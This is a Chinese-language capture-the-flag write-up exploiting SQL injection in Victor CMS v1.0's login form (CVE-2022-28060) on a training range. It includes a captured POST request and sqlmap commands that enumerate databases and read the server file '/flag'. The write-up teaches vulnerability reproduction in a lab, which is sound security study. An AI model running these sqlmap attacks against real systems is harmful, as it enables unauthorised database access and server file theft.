## 漏洞简介：

Victor CMS v1.0 /includes/login.php 存在sql注入

## 漏洞环境：

春秋云镜中的漏洞靶标，CVE编号为CVE-2022-28060

## 漏洞复现

  1. 访问漏洞环境观察发现有一个登录窗口，结合漏洞环境提示猜测可能是登录窗口存在POST型表单注入

![](https://image.3001.net/images/20230607/1686136823_648067f7e0a075c6e5e0c.png!small)

2.验证这个登录界面有没有存在sql注入

打开burpsuite开启代理，抓个登录包

![](https://image.3001.net/images/20230607/1686136946_64806872c538260c98089.png!small)![](https://image.3001.net/images/20230607/1686136965_64806885e8b762ace9f97.png!small)![](https://image.3001.net/images/20230607/1686137008_648068b0ba6b4afa92d34.png!small)抓到的提交包

> POST /includes/login.php HTTP/1.1  
> Host: eci-2ze5fylipvpw86bzt8bw.cloudeci1.ichunqiu.com  
> Content-Length: 44  
> Cache-Control: max-age=0  
> Upgrade-Insecure-Requests: 1  
> Origin: http://eci-2ze5fylipvpw86bzt8bw.cloudeci1.ichunqiu.com  
> Content-Type: application/x-www-form-urlencoded  
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36  
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.7  
> Referer: http://eci-2ze5fylipvpw86bzt8bw.cloudeci1.ichunqiu.com/  
> Accept-Encoding: gzip, deflate  
> Accept-Language: zh-CN,zh;q=0.9  
> Cookie:
> Hm_lvt_2d0601bd28de7d49818249cf35d95943=1686099032,1686120574,1686135765,1686135820;
> Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1686135820;
> PHPSESSID=5q8f09i2j15ko2qth1qp4k1maq  
> Connection: close
>
> user_name=123123&user_password=123123&login=

  

用sqlmap工具验证是否存在PSOT表单注入有3中参数可选

1) -r (从文件中加载http请求)

将提交的报文抓包后，把信息存储在一个txt文件中，构造下面命令:

> python sqlmap.py -r “文件路径” --dbs --batch

  

2) --data (指定扫描的参数)

POST提交数据，构造下面命令：

> python sqlmap.py -u "url" --data="提交数据" --dbs --batch

  

3) --forms (sqlmap自动填写表单注入)

注：因为是sqlmap自动填写表单所以得用登录界面的url才行

注：--level= 一共有5个等级（1-5） 不加 level 时，默认是1

构造下面命令：

> python sqlmap.py u "url" --forms --level=5 --dbs --batch

这里我用第一种

![](https://image.3001.net/images/20230607/1686139560_648072a8cdde85687cee7.png!small)![](https://image.3001.net/images/20230607/1686139572_648072b489746f470f7a9.png!small)

  

3.数据库中flag的获取

由于sqlmap在这个漏洞环境只能用时间盲注（会耗费很多时间）所以这里就不用传统方法找flag（库-表-字段-值）

sqlmap中--file-read 参数可以读取数据库中的内容，猜测DBMS是mysql

构造下面命令：

> python sqlmap.py -r "文件路径" --file-read "/flag" --dbms=mysql --batch

![](https://image.3001.net/images/20230607/1686141055_6480787f361af017ade18.png!small)![](https://image.3001.net/images/20230607/1686141080_648078982bbb66f89bbd5.png!small)flag已经导出并给出路径了

![](https://image.3001.net/images/20230607/1686141222_648079263a6f19ff1a268.png!small)

至此，flag就找到了

  

